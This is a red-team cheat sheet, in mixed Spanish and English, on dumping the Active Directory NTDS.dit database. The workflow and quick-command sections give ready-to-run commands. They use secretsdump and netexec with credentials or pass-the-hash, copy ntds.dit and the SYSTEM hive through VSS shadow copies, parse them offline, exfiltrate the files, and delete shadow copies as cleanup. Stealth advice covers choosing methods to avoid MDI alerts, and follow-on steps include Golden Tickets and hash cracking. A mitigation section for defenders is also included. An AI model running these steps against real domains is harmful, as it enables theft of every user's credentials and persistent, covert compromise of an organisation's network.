---
aliases:
  - NTDS.dit
  - NTDS Dump
  - AD Database Extraction
tags:
  - type/vulnerability
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - cred/kerberos
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
  - '[[Active Directory]]'
tertiary categories:
  - '[[Active Directory Explotación]]'
kind: CheatSheet
linked:
  - '[[NTDS.dit Extraction - Architecture y Storage]]'
  - '[[NTDS.dit Extraction - VSS y ntdsutil Methods]]'
  - '[[NTDS.dit Extraction - Remote Extraction]]'
  - '[[NTDS.dit Extraction - Offline Parsing]]'
  - '[[NTDS.dit Extraction - Detection y Mitigations]]'
  - '[[NTDS.dit Extraction - Tooling]]'
  - '[[DCSync]]'
  - '[[LSASS Dumping]]'
  - '[[Golden Ticket]]'
  - '[[Pass-the-Hash]]'
---
# NTDS.dit Extraction

***

## Cheatsheet

### 🏗️ Architecture y Storage

````tabs
tab: **Overview**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-overview]]

tab: **File Locations**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-paths]]

tab: **Objects & Creds**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-objects]]

tab: **Encryption Layers**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-encryption]]

tab: **DCSync vs File Methods**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-methods]]

tab: **Pre-Attack Recon**
![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-recon]]
````

### 🔧 Windows Extraction Methods

````tabs
tab: **vssadmin**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-vssadmin]]

tab: **Diskshadow**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-diskshadow]]

tab: **ntdsutil IFM**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-ntdsutil]]

tab: **reg save Hives**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-regsave]]

tab: **Robocopy /b**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-robocopy]]

tab: **OPSEC**
![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-opsec]]
````

### 🌐 Remote Extraction (DA creds)

````tabs
tab: **secretsdump Live**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-secretsdump]]

tab: **nxc / netexec**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-nxc]]

tab: **PtH Variant**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-pth]]

tab: **SharpSecDump**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-sharpsec]]

tab: **Requirements**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-req]]

tab: **OPSEC**
![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-opsec]]
````

### 🔬 Offline Parsing

````tabs
tab: **secretsdump LOCAL**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-secretsdump]]

tab: **DSInternals**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-dsinternals]]

tab: **NTDSDumpEx**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-ntdsdumpex]]

tab: **pypykatz registry**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-pypykatz]]

tab: **Output Filtering**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-filter]]

tab: **Hash Formats**
![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-hashfmt]]
````

### 🛡️ Detection & Mitigations

````tabs
tab: **Detection Events**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-events]]

tab: **MDI Alerts**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-mdi]]

tab: **MDE / Sentinel KQL**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-mde]]

tab: **Mitigations**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-mitigations]]

tab: **Hardening Checklist**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-checklist]]

tab: **Bypass Comparison**
![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-bypass]]
````

### 🛠️ Tooling

````tabs
tab: **impacket-secretsdump**
![[NTDS.dit Extraction - Tooling#^ntds-tool-secretsdump]]

tab: **nxc / netexec**
![[NTDS.dit Extraction - Tooling#^ntds-tool-nxc]]

tab: **DSInternals**
![[NTDS.dit Extraction - Tooling#^ntds-tool-dsinternals]]

tab: **Mimikatz lsadump**
![[NTDS.dit Extraction - Tooling#^ntds-tool-mimi]]

tab: **Otras herramientas**
![[NTDS.dit Extraction - Tooling#^ntds-tool-other]]

tab: **Recursos**
![[NTDS.dit Extraction - Tooling#^ntds-tool-resources]]
````

___

## Overview

**NTDS.dit** = base de datos de Active Directory. Contiene todos los objetos del dominio: usuarios, grupos, computers, con sus NT hashes, AES keys, password history. Extraer NTDS.dit = dump completo de credenciales del dominio entero.

Requiere: DA, Backup Operators, o cuenta con `SeBackupPrivilege`. Post-extracción necesita SYSTEM hive para decriptar (PEK → hashes).

**Dos rutas principales:**
- **DCSync (red):** Replication request via DRSUAPI — sin tocar archivos. Detectado por MDI via Event 4662.
- **File extraction (local en DC):** VSS snapshot → copiar ntds.dit + SYSTEM hive → parse offline. Más stealth ante MDI DCSync alerts.

### Diferencia con técnicas adyacentes

| | **NTDS.dit Extraction** | **DCSync** | **LSASS Dumping** |
|---|---|---|---|
| Source | ntds.dit DB file | DRSUAPI replication (live) | lsass.exe memory |
| Location | DC filesystem | Network — cualquier host con acceso | Per-host |
| Required | DA / Backup Ops / file access | DCSync ACE en domain root | Local admin |
| Output | Full domain hashes (offline) | Full domain hashes (live) | Active session creds |
| Detection | File access events | Event 4662 + MDI | Sysmon Event 10 |
| MDI | "NTDS.dit steal" | "DCSync attempt" | "Credential theft" |

___

## Workflow

```
1. Pre-recon:
   - Confirmar DA o Backup Operators.
   - Verificar conectividad DC (ports 445, 135).
   - Identificar MDI activo (condicioná el método).

2. Elegir método:
   a. DA + no MDI → impacket-secretsdump / nxc --ntds (más fácil, remoto).
   b. DA + MDI activo → ntdsutil IFM o vssadmin en el DC (local, evade DCSync alert).
   c. Backup Operators → robocopy /b desde VSS snapshot (sin DA).

3. Si método local en DC:
   a. RCE en DC (WinRM, WMI, psexec).
   b. vssadmin create shadow /for=C:
   c. copy ntds.dit + SYSTEM hive.
   d. Exfil (SMB share, impacket-smbserver, base64).
   e. Cleanup: vssadmin delete shadows /all /quiet.

4. Offline parse (desde Linux):
   impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm

5. Post-extraction:
   - NT hashes → Pass-the-Hash.
   - krbtgt hash → Golden Ticket.
   - AES256 keys → Overpass-the-Hash / Silver Ticket.
   - Crack offline con hashcat -m 1000.
```

___

## Detección rápida

```bash
# 1. Remote — más simple (requiere DA creds o hash)
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm

# 2. Remote via PtH
impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01.corp.local -just-dc-ntlm

# 3. nxc (preferred)
nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds

# 4. Local en DC (post-RCE)
vssadmin create shadow /for=C:
# → usar path del shadow copy
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM

# 5. Parse offline
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm
```

___

## Impacto

- **Full credential compromise** — todos los NT hashes, AES keys, password history del dominio.
- **Golden Ticket material** — krbtgt hash → forge TGT para cualquier user, duración arbitraria.
- **Pass-the-Hash masivo** — todos los admin hashes disponibles para lateral movement.
- **Forest persistence** — krbtgt hash permite re-entrada post-password reset (hasta doble reset).
- **Service account creds** — service accounts en NTDS = acceso a sistemas dependientes.
- **Trust account hashes** — inter-trust accounts → inter-forest lateral.
- **Password analysis** — history + hashes → patrones organizacionales, spray contra otros sistemas.
- **Offline crack** — ataques de diccionario sin lockout → passwords reales descubiertos.

___

## Mitigación (defender)

- **Tiered Admin Model:** DA accounts no hacen logon interactivo en workstations. Tier 0 isolation.
- **Restrict DCSync ACEs:** Solo `ENTERPRISE DOMAIN CONTROLLERS` con GetChangesAll. Audit regularmente.
- **Protected Users group:** DA accounts en Protected Users — NTLM disabled, RC4 disabled, 4h TGT.
- **MDI en todos los DCs:** Detecta DCSync y NTDS file access patterns.
- **Backup Operators vacío:** Solo cuentas de backup legítimas. Monitorear membresía.
- **LAPS en DCs:** Previene reuse de local admin hash entre DCs.
- **Privileged Access Workstations (PAWs):** DA solo desde PAW. Reduce lateral desde workstation comprometida.
- **krbtgt double reset:** Post-incident — reset krbtgt password dos veces con 12h entre resets (invalida Golden Tickets).
- **SACL en ntds.dit:** `Everyone: ReadData Audit` → Event 4663 para cualquier lectura del archivo.

___

## Para entender NTDS.dit

**Por qué NTDS.dit contiene todo el dominio:**
AD es un directorio distribuido (múltiples DCs replicando). Cada DC tiene copia completa del `domain partition` en NTDS.dit. Necesario para redundancia + autenticación local si la red cae. Desventaja: cualquier DC comprometido = full domain dump.

**Por qué necesitás SYSTEM hive también:**
NTDS.dit tiene hashes encrypted con PEK (Password Encryption Key). PEK está en NTDS.dit pero encrypted con BootKey. BootKey está en SYSTEM hive, scattered en 4 registry keys (`JD`, `Skew1`, `GBG`, `Data`). Sin SYSTEM = NTDS.dit inútil para extraer hashes.

**Por qué DCSync existe como método alternativo:**
`DsGetNCChanges` (DRSUAPI) es el protocolo que los DCs usan para replicar entre sí. Si tu cuenta tiene el ACE `GetChangesAll` en el domain root, Windows te deja usar ese protocolo — sin saber que vos no sos un DC. impacket reimplementa DRSUAPI → solicita hashes "como si fuera replicación legítima". No toca el filesystem, no necesita VSS.

**Por qué MDI detecta DCSync pero no file methods tan bien:**
MDI (ex Azure ATP) monitorea DRSUAPI calls — cualquier DRSUAPI request desde una IP que no es DC = alerta inmediata. File access en ntds.dit genera Event 4663, pero es menos específico y más ruidoso → alert menos confiable. Por eso file methods son más stealth contra MDI.

**Por qué krbtgt hash es el target más crítico:**
krbtgt es la cuenta KDC (Key Distribution Center). Su hash firma todos los TGTs del dominio. Con ese hash, mimikatz `kerberos::golden` forge un TGT completamente válido para cualquier user, cualquier grupo, duración ilimitada — el "Golden Ticket". Solo se invalida con doble reset del password de krbtgt (primer reset invalida tickets existentes, segundo invalida los forjados con el primer hash).

___

## Recursos

- [impacket](https://github.com/fortra/impacket) — secretsdump implementation.
- [netexec](https://github.com/Pennyw0rth/NetExec) — `--ntds` flag.
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) — PowerShell offline parser.
- [HackTricks — NTDS.dit](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntds.dit) — comprehensive reference.
- [The Hacker Recipes — NTDS](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) — reference.
- [MITRE ATT&CK T1003.003](https://attack.mitre.org/techniques/T1003/003/) — OS Credential Dumping: NTDS.
- [ired.team — NTDS.dit](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) — practical.
- [Microsoft — Backup Operators attack path](https://learn.microsoft.com/security/compass/privileged-access-security-levels) — Tier 0 implications.

***
